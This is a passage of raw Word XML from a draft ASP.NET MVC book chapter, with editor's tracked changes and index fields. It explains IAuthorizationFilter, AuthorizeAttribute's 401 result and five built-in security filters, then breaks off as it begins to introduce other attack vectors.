          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>.  When applied to an action,</w:t>
      </w:r>
      <w:r w:rsidR="00006618">
        <w:t xml:space="preserve"> an</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00705E20" w:rsidRPr="00705E20">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IAuthorizationFilter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will execute before any other action filters</w:t>
      </w:r>
      <w:ins w:id="35" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="006C760D">
        <w:rPr>
          <w:rPrChange w:id="36" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>filters</w:instrText>
      </w:r>
      <w:ins w:id="37" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">, and of course before the normal result. </w:t>
      </w:r>
      <w:r w:rsidR="001D69EB">
        <w:t xml:space="preserve">Listing 11.4 shows the declaration of </w:t>
      </w:r>
      <w:r w:rsidR="001D69EB" w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IAuthorizationFilter</w:t>
      </w:r>
      <w:r w:rsidR="001D69EB">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.4 IAuthorizationFilter</w:t>
      </w:r>
      <w:ins w:id="38" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D655A5">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="39" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>IAuthorizationFilter</w:instrText>
      </w:r>
      <w:ins w:id="40" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="001D69EB" w:rsidRPr="001D69EB" w:rsidRDefault="001D69EB" w:rsidP="001D69EB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="001D69EB">
        <w:t>public interface IAuthorizationFilter</w:t>
      </w:r>
      <w:ins w:id="41" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D655A5">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="42" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>IAuthorizationFilter</w:instrText>
      </w:r>
      <w:ins w:id="43" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="001D69EB" w:rsidRPr="001D69EB" w:rsidRDefault="001D69EB" w:rsidP="001D69EB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="001D69EB">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D69EB" w:rsidRPr="001D69EB" w:rsidRDefault="001D69EB" w:rsidP="001D69EB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="001D69EB">
        <w:tab/>
        <w:t>void OnAuthorization</w:t>
      </w:r>
      <w:ins w:id="44" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00AD6738">
        <w:rPr>
          <w:rPrChange w:id="45" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>OnAuthorization</w:instrText>
      </w:r>
      <w:ins w:id="46" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="001D69EB">
        <w:t>(AuthorizationContext filterContext);</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="001D69EB" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="001D69EB">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002921BB" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>If you wanted to create your own filter attribute for authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, you could implement this interface as an action filter and apply it to an action. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRDefault="00F0321F" w:rsidP="00135744">
      <w:pPr>
        <w:pStyle w:val="Body"/>
        <w:pPrChange w:id="47" w:author="Jeffrey" w:date="2010-03-15T16:38:00Z">
          <w:pPr>
            <w:pStyle w:val="ListBullet"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:commentRangeStart w:id="48"/>
      <w:commentRangeStart w:id="49"/>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:commentRangeEnd w:id="48"/>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00006618">
        <w:commentReference w:id="48"/>
      </w:r>
      <w:commentRangeEnd w:id="49"/>
      <w:r w:rsidR="00375C9A">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="49"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does its security check in the </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>OnAuthorization</w:t>
      </w:r>
      <w:ins w:id="50" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00AD6738">
        <w:rPr>
          <w:rPrChange w:id="51" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>OnAuthorization</w:instrText>
      </w:r>
      <w:ins w:id="52" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> method </w:t>
      </w:r>
      <w:r w:rsidRPr="00506E62">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:rPrChange w:id="53" w:author="Jeffrey" w:date="2010-03-15T16:38:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve">, and sets the </w:t>
      </w:r>
      <w:r w:rsidR="002921BB" w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>AuthorizationContext</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve">'s </w:t>
      </w:r>
      <w:r w:rsidR="002921BB" w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> property to </w:t>
      </w:r>
      <w:r w:rsidR="002921BB" w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>HttpUnauthorizedResult</w:t>
      </w:r>
      <w:ins w:id="54" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009321E9">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="55" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HttpUnauthorizedResult</w:instrText>
      </w:r>
      <w:ins w:id="56" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> - the mechanism for returning that </w:t>
      </w:r>
      <w:r w:rsidR="002921BB" w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>401</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> status code</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are several other </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IAuthenticationFilter</w:t>
      </w:r>
      <w:ins w:id="57" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00C90774">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="58" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>IAuthenticationFilter</w:instrText>
      </w:r>
      <w:ins w:id="59" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> implementations in ASP.NET MVC; all are used to short-circuit the normal response to protect against undesired requests.</w:t>
      </w:r>
      <w:r w:rsidR="003C4522">
        <w:t xml:space="preserve">  Chapter 9 covered filters</w:t>
      </w:r>
      <w:ins w:id="60" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="006C760D">
        <w:rPr>
          <w:rPrChange w:id="61" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>filters</w:instrText>
      </w:r>
      <w:ins w:id="62" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="003C4522">
        <w:t>, and these five filters deal specifically with security.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="005524D4" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="005524D4" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ChildActionOnlyAttribute</w:t>
      </w:r>
      <w:ins w:id="63" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="002D13BD">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="64" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ChildActionOnlyAttribute</w:instrText>
      </w:r>
      <w:ins w:id="65" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="005524D4" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>RequireHttpsAttribute</w:t>
      </w:r>
      <w:ins w:id="66" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00424BC5">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="67" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>RequireHttpsAttribute</w:instrText>
      </w:r>
      <w:ins w:id="68" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="005524D4" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="69" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="0014436C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="70" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="71" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="005524D4" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ValidateInputAttribute</w:t>
      </w:r>
      <w:ins w:id="72" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="003F5C46">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="73" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateInputAttribute</w:instrText>
      </w:r>
      <w:ins w:id="74" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F0321F" w:rsidRPr="00F0321F" w:rsidRDefault="00F0321F" w:rsidP="00F0321F">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We've seen how </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can help us manage authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>, now let's turn our attention to other</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t>, more insidious</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> att</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t>ack</w:t>
      </w:r>
      <w:ins w:id="75" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="76" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="77" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> vectors. While authentication and authorization checks prevent hapless visitors from accessing secure areas</w:t>
      </w:r>
      <w:ins w:id="78" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00071ECB">
        <w:rPr>
          <w:rPrChange w:id="79" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>secure areas</w:instrText>
      </w:r>
      <w:ins w:id="80" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="002921BB">
        <w:t>, we still must protect our application from hackers and thieves who attempt to exploit</w:t>
      </w:r>
      <w:ins w:id="81" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00FE14DF">
        <w:rPr>
          <w:rPrChange w:id="82" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>exploit</w:instrText>
      </w:r>
      <w:ins w:id="83" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
